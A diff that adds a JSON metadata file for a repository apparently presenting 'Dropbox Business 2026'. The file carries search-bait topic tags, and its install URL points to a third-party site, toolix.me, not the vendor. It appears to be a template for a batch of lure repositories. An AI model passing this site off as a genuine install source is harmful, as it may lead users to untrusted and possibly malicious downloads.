@@ -1,0 +1,23 @@
+{
+  "repo": "dropbox-business-2026",
+  "product": "Dropbox Business 2026",
+  "kind": "productivity",
+  "install_type": "toolix",
+  "install_url": "https://toolix.me/",
+  "batch": "new4",
+  "format": "license-md-toolix-v1",
+  "category": "cloud-sync",
+  "topics": [
+    "dropbox-business",
+    "team-folder-sync",
+    "file-version-history",
+    "dropbox-windows",
+    "office-sharing-2026",
+    "how-to-install-dropbox",
+    "dropbox-desktop-package",
+    "selective-sync-suite",
+    "business-cloud-desk",
+    "dropbox-premium-edition"
+  ],
+  "site": "toolix.me"
+}
